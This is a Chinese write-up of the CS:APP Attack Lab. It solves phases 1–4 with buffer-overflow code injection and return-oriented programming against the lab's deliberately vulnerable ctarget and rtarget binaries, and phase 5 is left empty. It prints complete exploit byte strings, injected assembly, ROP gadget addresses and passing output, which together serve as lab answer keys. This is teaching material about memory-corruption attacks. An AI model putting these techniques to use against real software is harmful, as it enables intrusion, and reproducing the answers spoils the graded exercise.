# attacklab

- [attacklab](#attacklab)
  - [准备](#准备)
    - [文件下载](#文件下载)
    - [文件组成](#文件组成)
    - [提交](#提交)
    - [说明](#说明)
  - [正式开始](#正式开始)
    - [Code Injection Attack](#code-injection-attack)
      - [pahse\_1](#pahse_1)
      - [phase\_2](#phase_2)
      - [phase\_3](#phase_3)
    - [Return-Oriented Programming](#return-oriented-programming)
      - [phase\_4](#phase_4)
      - [phase\_5](#phase_5)


## 准备

### 文件下载

所有文件均可以从官网上直接下载：[Lab Assignments](http://csapp.cs.cmu.edu/3e/labs.html)

与前两个使用不同的是，本实验需要严格按照 [PDF](http://csapp.cs.cmu.edu/3e/attacklab.pdf) 内的说明完成

### 文件组成

主要文件有三个：

* `ctarget`：为 `code-injection` 攻击，用于 `phase 1` 到 `phase 3`

* `rtarget`：为 `return-oriented programming` 攻击，用于 `phase 4` 到 `phase 5`

* `hex2raw`：用于生成攻击字符串

一个 `cookie.txt` 文件用于充当验证码的角色，后面会用到

### 提交

`ctarget` 与 `rtarget` 的用法一致：

```
Usage: [-hq] ./ctarget -i <infile> 
  -h          Print help information
  -q          Don't submit result to server
  -i <infile> Input file

Usage: [-hq] ./rtarget -i <infile> 
  -h          Print help information
  -q          Don't submit result to server
  -i <infile> Input file
```

我们不提交到服务器，因此需要带 `-q` 参数运行

`hex2raw` 的用法为：

```
usage: ./hex2raw [-h] [i IN] [-o OUT]
 -h Print this help message
 -i IN specify input text file
 -o OUT specify output data file
```

当然，可以直接 `./hex2raw < input_file > output_file`，而前两个不能这样子（需要带 `-q` 参数运行）

### 说明

`ctarget` 和 `rtarget` 的输入均是从标准输入读取，二者均是通过函数 `getbuf` 实现：

```
unsigned getbuf()
{
  char buf[BUFFER_SIZE];
  Gets(buf);
  return 1;
}
```

这里的 `Gets` 函数与标准库的 `gets` 函数行为一致，均是从标准库读取而**不做任何的边界检查**

---

## 正式开始

### Code Injection Attack

#### pahse_1

参照 [PDF](http://csapp.cs.cmu.edu/3e/attacklab.pdf) 中 `4.1` 的部分

在 `test` 函数中会调用 `getbuf`，我们的任务是在 `getbuf` 执行完之后不再返回 `test` 函数而是返回到 `touch1` 函数

我们考察 `getbuf` 函数行为：

```assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	ret    
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

函数开始时会分配 `0x28` 也就是 `40` 字节的堆栈，随后调用 `Gets` 函数

> 需要说明的是，我们的内存地址为 `64` 位，并且在内存当中以小端存储

在调用 `getbuf` 函数之前，`call` 指令便会将 `getbuf` 的下一条指令的地址压入其过程的栈帧中，之后的部分才是 `getbuf` 过程的栈帧

因此我们可以用零来将那 `40` 个字节全部填充，然后在原先是 `call` 函数返回地址的地方写入 `touch1` 的地址

`touch1` 的地址为：`0x4017c0`，前面补零并用小端表示为：`0xc0 17 40 00`

因此最终答案为：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

运行结果：

```bash
$ ./hex2raw < answer/phase_1/input > answer/phase_1/output
$ ./ctarget -qi answer/phase_1/output 
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 
```

#### phase_2

参照 [PDF](http://csapp.cs.cmu.edu/3e/attacklab.pdf) 中 `4.2` 的部分

与上一步类似，我们在调用 `getbuf` 函数之后不能返回到 `test` 而是要到 `touch2`

需要注意的是，`touch2` 函数是带有参数的，我们需要让参数 `val` 的值与 `cookie` 的值相同即可，这便是本题需要解决的问题

> 我们首先需要知道一点：程序计数器 `PC` 所指向的内存地址就是下一条指令的字节级编码，因此如果我们希望程序去执行我们期望的代码，我们**除了需要将代码的字节级编码插入到内存中以外，还需要将 `PC` 的值设置对应的地址**

我们重新把目光放到 `getbuf` 函数上：

```assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	ret    
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

我们发现这个函数只是简单的分配 `40` 字节大小的栈帧，随后**调用 `Gets` 函数对该 `40` 字节的区域进行写入**，仅仅只是写入，并不会当成指令执行

当 `getbuf` 结束时，`ret` 指令会弹出一个跳转地址，然后 `PC` 便会跳转到该地址开始执行指令（也就是在 `test` 中 `getbuf` 函数的下一条指令的地址）

也就是说，`ret` 指令相当于执行：`PC = *rsp, rsp++`

那么如果我们需要跳转到某个地址开始执行指令的话，只能用 `ret` 的方式（因为该指令会设置 `PC` 的值）。具体地，先将待跳转地址压入栈中，随后执行 `ret` 指令即可

到此为止，我们便可以正式开始代码插入了，我们的需求是：

* 将 `%rdi` 的值改为 `cookie`
* 跳转到 `touch2` 执行代码（先将地址压入栈中，随后使用 `ret` 指令）

由于我们不知道这三条指令的字节级编码，因此我们先用汇编语言写出来，随后用 `gcc` 带 `-c` 参数进行汇编（`-c` 表示值编译和汇编而不进行链接），得到可执行程序后用 `objdump` 进行反汇编即可得到指令对应的字节级编码

在 `insert.s` 文件中，汇编代码如下：

```assembly
mov $0x59b997fa, %rdi
push $0x4017ec
ret

```

执行如下语句：

```bash
gcc -c insert.s -o insert
objdump -d insert > insert.asm
```

`insert.asm` 的内容如下：

```assembly
0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	push   $0x4017ec
   c:	c3                   	ret    
```

因此我们插入的字节级数据便得到了。但如果直接将以下内容写入，我们是得不到想要的结果的

```
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
```

正如我们刚才分析的那样，`Gets` 函数**仅仅是对栈空进进行写入**，程序计数器 `PC` 的值并没有执行栈顶，因此也就不会执行对应的代码

`getbuf` 函数结束后会执行一次 `ret`，我们在 `phase_1` 阶段将这个值覆盖为 `touch1` 的地址，我们在这里将其覆盖为栈顶地址，这样 `PC` 就可以执行栈顶了

也就是说，我们需要找到在 `getbuf` 中，`%rsp` 下降 `40` 字节后的地址

我们启动 `cgdb` 开始调试：

```bash
cgdb ./ctarget

# 在 getbuf 处打断点
(gdb) b getbuf 
Breakpoint 1 at 0x4017a8: file buf.c, line 12.

Breakpoint 1, getbuf () at buf.c:12
12      in buf.c
(gdb) n
14      in buf.c
(gdb) i r rsp
rsp            0x5561dc78          0x5561dc78
```

我们看到分配完 `40` 字节后的 `%rsp` 的地址为 `0x5561dc78` ，将地址按小端排列后覆盖原先的 `getbuf` 的返回地址，有：

```
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

运行结果：

```bash
$ ./ctarget -qi ./answer/phase_2/output 
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
```

#### phase_3

参照 [PDF](http://csapp.cs.cmu.edu/3e/attacklab.pdf) 中 `4.3` 的部分

这里 `CMU` 的教授给了个提示：`When functions hexmatch and strncmp are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the string representation of your cookie.`

意思是函数 `hexmatch` 和 `strncmp` 的调用会将栈空间给覆盖，因此需要小心地存储 `cookie` 所表示的字符串

`hexmatch` 函数的定义如下：

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
  char cbuf[110];
  /* Make position of check string unpredictable */
  char *s = cbuf + random() % 100;
  sprintf(s, "%.8x", val);
  return strncmp(sval, s, 9) == 0;
}
```

这个函数会将 `cookie` 的值**以 `16` 进制打印到字符数组 `s` 中**，然后在比较 `sval` 和 `s` 的前九个字符

也就是说，我们传入的 `sval` 所指向的字符串需要以 `ASCII` 字符的形式存储 `cookie`

我们去看 `touch3` 的汇编代码：

```assembly
00000000004018fa <touch3>:
  4018fa:	53                   	push   %rbx
  4018fb:	48 89 fb             	mov    %rdi,%rbx
  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc <vlevel>
  401905:	00 00 00 
  401908:	48 89 fe             	mov    %rdi,%rsi
  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 <cookie>
  401911:	e8 36 ff ff ff       	call   40184c <hexmatch>
  401916:	85 c0                	test   %eax,%eax
  401918:	74 23                	je     40193d <touch3+0x43>
  40191a:	48 89 da             	mov    %rbx,%rdx
  40191d:	be 38 31 40 00       	mov    $0x403138,%esi
  401922:	bf 01 00 00 00       	mov    $0x1,%edi
  401927:	b8 00 00 00 00       	mov    $0x0,%eax
  40192c:	e8 bf f4 ff ff       	call   400df0 <__printf_chk@plt>
  401931:	bf 03 00 00 00       	mov    $0x3,%edi
  401936:	e8 52 03 00 00       	call   401c8d <validate>
  40193b:	eb 21                	jmp    40195e <touch3+0x64>
  40193d:	48 89 da             	mov    %rbx,%rdx
  401940:	be 60 31 40 00       	mov    $0x403160,%esi
  401945:	bf 01 00 00 00       	mov    $0x1,%edi
  40194a:	b8 00 00 00 00       	mov    $0x0,%eax
  40194f:	e8 9c f4 ff ff       	call   400df0 <__printf_chk@plt>
  401954:	bf 03 00 00 00       	mov    $0x3,%edi
  401959:	e8 f1 03 00 00       	call   401d4f <fail>
  40195e:	bf 00 00 00 00       	mov    $0x0,%edi
  401963:	e8 d8 f4 ff ff       	call   400e40 <exit@plt>
```

可以看到在开头并没有**分配栈帧**，对全局变量 `val` 赋值完毕后直接调用 `hexmatch` 了，`hexmatch` 的汇编代码如下：

```assembly
000000000040184c <hexmatch>:
  40184c:	41 54                	push   %r12
  40184e:	55                   	push   %rbp
  40184f:	53                   	push   %rbx
  401850:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
  401854:	41 89 fc             	mov    %edi,%r12d
  401857:	48 89 f5             	mov    %rsi,%rbp
  40185a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  401861:	00 00 
  401863:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
  401868:	31 c0                	xor    %eax,%eax
  40186a:	e8 41 f5 ff ff       	call   400db0 <random@plt>
  40186f:	48 89 c1             	mov    %rax,%rcx
  401872:	48 ba 0b d7 a3 70 3d 	movabs $0xa3d70a3d70a3d70b,%rdx
  401879:	0a d7 a3 
  40187c:	48 f7 ea             	imul   %rdx
  40187f:	48 01 ca             	add    %rcx,%rdx
  401882:	48 c1 fa 06          	sar    $0x6,%rdx
  401886:	48 89 c8             	mov    %rcx,%rax
  401889:	48 c1 f8 3f          	sar    $0x3f,%rax
  40188d:	48 29 c2             	sub    %rax,%rdx
  401890:	48 8d 04 92          	lea    (%rdx,%rdx,4),%rax
  401894:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  401898:	48 c1 e0 02          	shl    $0x2,%rax
  40189c:	48 29 c1             	sub    %rax,%rcx
  40189f:	48 8d 1c 0c          	lea    (%rsp,%rcx,1),%rbx
  4018a3:	45 89 e0             	mov    %r12d,%r8d
  4018a6:	b9 e2 30 40 00       	mov    $0x4030e2,%ecx
  4018ab:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
  4018b2:	be 01 00 00 00       	mov    $0x1,%esi
  4018b7:	48 89 df             	mov    %rbx,%rdi
  4018ba:	b8 00 00 00 00       	mov    $0x0,%eax
  4018bf:	e8 ac f5 ff ff       	call   400e70 <__sprintf_chk@plt>
  4018c4:	ba 09 00 00 00       	mov    $0x9,%edx
  4018c9:	48 89 de             	mov    %rbx,%rsi
  4018cc:	48 89 ef             	mov    %rbp,%rdi
  4018cf:	e8 cc f3 ff ff       	call   400ca0 <strncmp@plt>
  4018d4:	85 c0                	test   %eax,%eax
  4018d6:	0f 94 c0             	sete   %al
  4018d9:	0f b6 c0             	movzbl %al,%eax
  4018dc:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
  4018e1:	64 48 33 34 25 28 00 	xor    %fs:0x28,%rsi
  4018e8:	00 00 
  4018ea:	74 05                	je     4018f1 <hexmatch+0xa5>
  4018ec:	e8 ef f3 ff ff       	call   400ce0 <__stack_chk_fail@plt>
  4018f1:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp
  4018f5:	5b                   	pop    %rbx
  4018f6:	5d                   	pop    %rbp
  4018f7:	41 5c                	pop    %r12
  4018f9:	c3                   	ret    
```

分配栈帧的是 `add $0xffffffffffffff80,%rsp`，相当于分配 `128` 字节的空间，也就是 `0x80`

`touch3` 地址存储在 `0x5561dca0` 处，而在 `getbuf` 的结尾处，由于执行了 `ret` 指令，因此 `%rsp` 的值需要再此基础上加上 `0x8` ，也就是 `0x5561dca8`

那么从当前 `%rsp` 的位置，到 `getbuf` 栈顶所在地址 `0x5561dc78` 之间的内容，一定会被 `hexmatch` 所覆盖，因此我们需要另外寻找办法

有一个办法是，我们在跳转到 `touch3` 之前，将栈指针 `%rsp` 的值赋值为栈顶地址，也就是 `0x5561dc78` ，这之后再去调用 `touch3` ，那么之后分配的栈帧就不会影响我们插入的内容了

我们写出如下汇编代码，保存为文件 `insert.s`

```assembly
leaq 0x5561dc78, %rsp
leaq 0x5561dc90, %rdi
push $0x4018fa
ret

```

执行如下语句：

```bash
$ gcc -c ./answer/phase_3/insert.s -o ./answer/phase_3/insert
$ objdump -d ./answer/phase_3/insert > ./answer/phase_3/insert.asm 
```

`insert.asm` 文件内容为：

```assembly
   0:	48 8d 24 25 78 dc 61 	lea    0x5561dc78,%rsp
   7:	55 
   8:	48 8d 3c 25 90 dc 61 	lea    0x5561dc90,%rdi
   f:	55 
  10:	68 fa 18 40 00       	push   $0x4018fa
  15:	c3                   	ret    
```

我们将这些字符依次写入，再将 `touch3` 的开始地址作为 `getbuf` 的中 `ret` 的跳转地址，得到最终答案：

```
48 8d 24 25 78 dc 61 55
48 8d 3c 25 90 dc 61 55
68 fa 18 40 00 c3 00 00
35 39 62 39 39 37 66 61
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

运行结果：

```bash
$ ./ctarget -qi ./answer/phase_3/output 
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 8D 24 25 78 DC 61 55 48 8D 3C 25 90 DC 61 55 68 FA 18 40 00 C3 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
```

### Return-Oriented Programming

从这一阶段开始将会介绍一种新的代码攻击方式 `ROP, Return-Oriented Programming`，直译就是**面向返回值编程**，提出这种攻击方式是因为：

* 栈随机化：程序运行时栈的位置每次都会变化，我们无法定位堆栈的地址（虽然栈的地址是随机的，但函数的入口地址已经不会发生改变）
* 可执行区域限制：栈内的代码被标记为不可执行，如果执行的话会报 `segmenttation fault`

下面我们详细说明一下 `ROP` 的编程思想：

`ROP` 的核心在于 `ret` 指令，该指令可以分解为：`PC = *rsp, rsp++`，也就是会将当前**栈顶**处的**地址**赋值给 `PC` ，然后将栈顶指针向上增加 `64` 个字节（一定是将地址返回给 `PC` ，而**不是指令的字节序列**）

在一段程序中，如果一个 `ret` 指令前的字节序列，恰好可以由我们需要的指令的字节级编码前后拼接而成，便可以实现 `ROP`，我们称这一个连续的指令序列为 `gadget`

我们来看书中的例子：

```assembly
400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi)
400f1b: c3 retq
```

这是一段正常的代码。但字节序列 `48 89 c7` 可以被翻译为 `movq %rax, %rdi` ，并且后面接的正好是 `ret` ，因此便可以实现 `ROP`

这里有一个疑问是，为什么一定要以 `ret` 为结尾，这一点将在 `phase_4` 中得到解答

#### phase_4

参照 [PDF](http://csapp.cs.cmu.edu/3e/attacklab.pdf) 中 `5.1` 的部分，这个实验一定要将 `PDF` 中的内容全部理解，不然做不下去

我们需要在 `rtarget` 中完成 `phase_2` 一样的任务，只不过 `rtarget` 与 `ctarget` 不同的是加入了上面的两种防止缓冲器攻击的机制

核心思想还是先对 `%rdi` 进行赋值，然后跳转到 `touch2` 的地址即可

由于我们不能将立即数直接赋值给一个寄存器，因此我们需要将立即数赋值给寄存器，然后再将这个寄存器赋值给 `%rdi`

我们可以考虑用 `pop` 指令来对寄存器进行赋值，然后再用 `mov` 指令对 `%rdi` 进行赋值

查表发现，`pop %rax` 的字节级编码为 `58` ，我们在 `rtarget` 中搜索 `58` 的位置，得到如下结果：

```assembly
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	ret    
```

字节 `90` 为 `nop` 的字节级编码，因此可以直接忽视

我们需要的地址从 `0x4019ab` 开始，然后以 `c3` 结束（也就是以 `ret` 结束）

因此**我们将地址 `0x4019ab` 注入到堆栈中，覆盖原先 `getbuf` 的返回值，这样就可以让 `PC` 跳到我们指定的位置了**

**当执行 `ret` 之后，`PC` 会回到原先的位置，如果后面还有一次我们注入的地址，那么就会再执行一次刚刚的行为**，所以这就是为什么一定要以 `ret` 为结尾

在我们从栈中弹出 `cookie` 后，我们需要执行 `mov %rax, %rdi`，该指令的字节级编码为：`48 89 c7`，我们找到：

```assembly
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	ret    
```

我们需要的地址为 `0x4019c5`，到此我们也就执行完所有需要的指令了，之后将 `touch2` 的地址写入栈中即可

答案如下：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
c5 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

执行结果：

```bash
$ ./rtarget -qi ./answer/phase_4/output 
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
```

#### phase_5

